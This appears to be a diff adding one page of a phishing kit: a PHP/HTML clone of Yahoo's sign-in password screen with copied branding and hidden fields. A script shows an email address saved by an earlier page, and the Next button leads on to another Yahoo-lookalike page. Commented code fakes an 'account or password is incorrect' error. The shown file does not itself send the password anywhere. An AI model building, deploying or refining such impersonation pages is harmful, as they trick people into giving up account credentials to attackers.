@@ -1,0 +1,161 @@
+<?php
+
+    session_start();
+
+?>
+
+<!DOCTYPE html>
+<html id="Stencil" class="js grid light-theme">
+
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no">
+    <link rel="stylesheet" href="styles/yahoo.css">
+    <link rel="shortcut icon" href="images/yahoo.ico" type="image/x-icon">
+    <title>Yahoo</title>
+    <style>
+        #login-passwd:invalid {
+            box-shadow: none;
+        }
+
+        #passError {
+            color: red;
+        }
+        .challenge-header{
+            display:flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        @media (max-width: 800px) {
+            .login-box {
+                width: 100%;
+                margin: 0px;
+                padding: 0px;
+                box-shadow: none;
+                border: none;
+            }
+
+            .mbr-desktop-hd {
+                display: none;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div id="login-body" class="loginish puree-v2 grid ">
+        <div class="mbr-desktop-hd"><span class="column"><a style="cursor: pointer;"><img src="images/yahoo.png"
+                        alt="Yahoo" class="logo " width="" height="36"><img
+                        src="Yahoo_files/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo"
+                        class="dark-mode-logo logo " width="" height="36"></a></span>
+            <span class="column help txt-align-right"><a style="cursor: pointer;">Help</a></span>
+        </div>
+        <div class="login-box-container">
+            <div class="login-box right">
+                <div class="mbr-login-hd txt-align-center"><img src="images/yahoo.png" alt="Yahoo"
+                        class="logo yahoo-en-GB" width="" height="27"><img
+                        src="Yahoo_files/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo"
+                        class="dark-mode-logo logo yahoo-en-GB" width="" height="27"></div>
+                <div class="challenge password-challenge">
+                    <div class="challenge-header">
+                        <div class="for-email-showing"></div>
+                    </div>
+                    <div id="password-challenge" class="primary">
+                        <strong class="challenge-heading">Enter&nbsp;password</strong>
+                        <span class="txt-align-center challenge-desc">to finish signing&nbsp;in</span>
+                        <input type="hidden" name="crumb" value="vQYFNoVr5Yu"><input type="hidden" name="acrumb"
+                            value="cAqgl2uC"><input type="hidden" name="sessionIndex" value="QQ--"><input type="hidden"
+                            name="displayName">
+                        <div class="hidden-username"></div>
+                        <input type="hidden" name="isShowButtonClicked" id="show-button-clicked" value=""><input
+                            type="hidden" name="showButtonStatus" id="show-button-status" value=""><input type="hidden"
+                            name="prefersReducedMotion" id="prefers-reduce-motion" value="">
+                        <div id="password-container" class="input-group password-container blurred"><input
+                                type="password" id="login-passwd" class="password" name="emailPassword" placeholder=" "
+                                autofocus="" autocomplete="current-password" data-rapid-tracking="true"
+                                data-ylk="elm:input;elmt:focus;slk:passwd;mKey:password-challenge-focus-passwd"
+                                required>
+                            <label for="login-passwd" id="password-label" class="password-label">Password</label>
+                            <div class="caps-indicator hide" id="caps-indicator" title="Caps lock is&nbsp;on"></div>
+                            <button type="button" class="show-hide-toggle-button hide-pw"
+                                id="password-toggle-button"></button>
+                        </div>
+                        <div id="passError">
+
+                        </div>
+                        <div class="button-container">
+                            <button type="submit" id="login-signin"
+                                class="pure-button puree-button-primary puree-spinner-button challenge-button"
+                                name="verifyPassword" value="Next" data-rapid-tracking="true"
+                                data-ylk="elm:btn;elmt:primary;slk:next;mKey:password-challenge-next" onclick="locationChange()">Next</button>
+                        </div>
+                        <div class="forgot-cont challenge-button-link"><input type="button"
+                                class="pure-button puree-button-link challenge-button-link"
+                                data-ylk="elm:btn;elmt:skip;slk:skip;mKey:password-challenge-skip-recovery"
+                                value="Forgotten&nbsp;password?"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const emailGet = localStorage.getItem('yahoo');
+        document.querySelector(".for-email-showing").textContent = emailGet;
+        var timesClicked = 0;
+
+        function showPass() {
+            if (timesClicked >= 1) {
+                document.getElementById("login-passwd").type = "password";
+                document.getElementById("password-toggle-button").classList.remove('show-pw');
+                document.getElementById("password-toggle-button").classList.add('hide-pw');
+                timesClicked = 0;
+            } else {
+                document.getElementById("login-passwd").type = "text";
+                document.getElementById("password-toggle-button").classList.remove('hide-pw');
+                document.getElementById("password-toggle-button").classList.add('show-pw');
+                timesClicked++;
+            }
+        }
+
+        document.getElementById("password-toggle-button").onclick = showPass;
+
+
+        // document.getElementById("passError").innerHTML = '<p class="error-msg" role="alert" data-error="messages.ERROR_INVALID_PASSWORD">Invalid password. Please try&nbsp;again</p>';
+        // document.getElementById("password-container").classList.add("error");
+
+
+
+        // document.querySelector("#login-signin").addEventListener("click", () => {
+        //     let pass = document.querySelector("input[type='password']")
+        //     if (pass.value.length > 9) {
+        //         locationChange("../FAQ-Question/index.html")
+        //     } else {
+        //         document.getElementById("passError").classList.add("has-error");
+        //         document.getElementById("passError").innerHTML = "<div id=\"passwordError\" class=\"error ext-error\"><span>Your account or password is incorrect.</span></div>";
+        //     }
+        // })
+
+        function locationChange() {
+            window.location.assign("../yahoo-two/Yahoo.html");
+        }
+        //    for loading  
+        $('body').append('<div  class="loader-container"><img src="images/loading.png" class="img-laoding" /></div>');
+        $(window).on('load', function () {
+            setTimeout(removeLoader, 2000); //wait for page load PLUS two seconds.
+        });
+        function removeLoader() {
+            $(".loader-container").fadeOut(500, function () {
+                // fadeOut complete. Remove the loading div
+                $(".loader-container").remove(); //makes page more lightweight 
+            });
+        }
+
+
+    </script>
+
+</body>
+
+</html>
